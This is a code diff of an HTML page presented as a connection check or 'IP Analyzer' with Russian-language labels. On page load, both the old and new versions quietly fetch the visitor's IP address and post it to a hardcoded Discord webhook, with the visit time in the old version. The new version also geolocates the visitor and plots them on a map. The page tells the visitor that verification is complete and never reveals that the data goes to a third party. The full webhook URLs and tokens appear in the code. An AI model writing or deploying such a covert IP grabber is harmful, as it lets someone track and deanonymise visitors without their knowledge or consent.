@@ -1,76 +1,187 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>IP Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Analyzer</title>
+    
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
             background-color: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
+
         .container {
             text-align: center;
             padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
             background-color: white;
+            margin: 20px;
+            width: 80%;
+        }
+
+        #map {
+            height: 500px;
+            width: 80%;
+            margin: 20px auto;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .info {
+            text-align: center;
+            padding: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        #error {
+            color: red;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Checking your connection...</h1>
-        <p id="status">Please wait</p>
+        <h1>Connection Analysis</h1>
+        <p id="status">Initializing...</p>
+        <p id="error"></p>
     </div>
 
+    <div class="container">
+        <div class="info">
+            <p id="location-info">Определение местоположения...</p>
+        </div>
+        <div id="map"></div>
+    </div>
+
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+
     <script>
-        // Получаем IP через сторонний сервис
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1338247584950653008/7vtzfHy7uVzpreP9TWsFtG4iNMVZMvskrL43pPZBlmM-ep2zuoDvvLx6U4H8sC4D1sfv';
+        let map = null;
+
+        // Функции для проверки соединения
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                return await response.json();
             } catch (error) {
-                return 'Unknown';
+                showError(`IP Detection Failed: ${error.message}`);
+                throw error;
             }
         }
 
-        // Отправка в Discord через CORS-прокси
         async function sendToDiscord(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1338244151417901086/NB_mQmzK15E3xIcHD5kMZMS5Dye_FdhPTgmqbL8mx0ESpB10qmrxfJWFSP0bLnk2E1rX';
-            const proxyURL = 'https://cors-anywhere.herokuapp.com/';
-            
-            const payload = {
-                content: `New visit!\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`,
-                username: "IP Logger"
-            };
-
             try {
-                await fetch(proxyURL + webhookURL, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Origin': window.location.origin
-                    },
-                    body: JSON.stringify(payload)
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `New Connection: ${ip}`
+                    })
                 });
-                document.getElementById('status').textContent = 'Verification complete!';
+                
+                if (!response.ok) throw new Error(`Discord API Error: ${response.status}`);
             } catch (error) {
-                console.error('Error:', error);
-                document.getElementById('status').textContent = 'Connection verified';
+                showError(`Notification Failed: ${error.message}`);
+                throw error;
             }
         }
 
-        // Основной поток
-        (async () => {
-            const ip = await getIP();
-            await sendToDiscord(ip);
-        })();
+        // Функции для определения местоположения
+        async function getLocation(ip) {
+            try {
+                const apis = [
+                    `https://ipapi.co/${ip}/json/`,
+                    `https://ipwhois.pro/?format=json&ip=${ip}`,
+                    `https://freeipapi.com/api/json/${ip}`
+                ];
+
+                let data = null;
+                
+                for (const api of apis) {
+                    try {
+                        const response = await fetch(api);
+                        if (!response.ok) continue;
+                        data = await response.json();
+                        if (data.latitude && data.longitude) break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+
+                if (!data?.latitude) throw new Error('Все API недоступны');
+
+                const lat = data.latitude;
+                const lng = data.longitude;
+                const city = data.city || data.regionName || '';
+                const country = data.country_name || data.country || '';
+
+                document.getElementById('location-info').innerHTML = `
+                    ${city ? `Город: ${city}<br>` : ''}
+                    ${country ? `Страна: ${country}<br>` : ''}
+                    Координаты: ${lat.toFixed(4)}, ${lng.toFixed(4)}
+                `;
+
+                if (map) map.remove();
+                map = L.map('map').setView([lat, lng], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([lat, lng]).addTo(map);
+
+            } catch (error) {
+                document.getElementById('location-info').innerHTML = 
+                    'Не удалось определить местоположение.<br>Возможные причины:'
+                    + '<ul>'
+                    + '<li>Проблемы с интернет-соединением</li>'
+                    + '<li>Ограничения вашей сети</li>'
+                    + '<li>Лимиты API-сервисов</li>'
+                    + '</ul>';
+            }
+        }
+
+        // Общие функции
+        function showError(message) {
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('error').innerHTML = message;
+        }
+
+        // Инициализация
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                // Этап 1: Получение и отправка IP
+                document.getElementById('status').textContent = 'Checking network...';
+                const { ip } = await getIP();
+                await sendToDiscord(ip);
+                document.getElementById('status').textContent = 'Verification complete!';
+
+                // Этап 2: Определение местоположения
+                document.getElementById('location-info').textContent = 'Идет определение...';
+                await getLocation(ip);
+
+            } catch (error) {
+                showError('System Error: Please try again later');
+                console.error('Error:', error);
+            }
+        });
     </script>
 </body>
 </html>
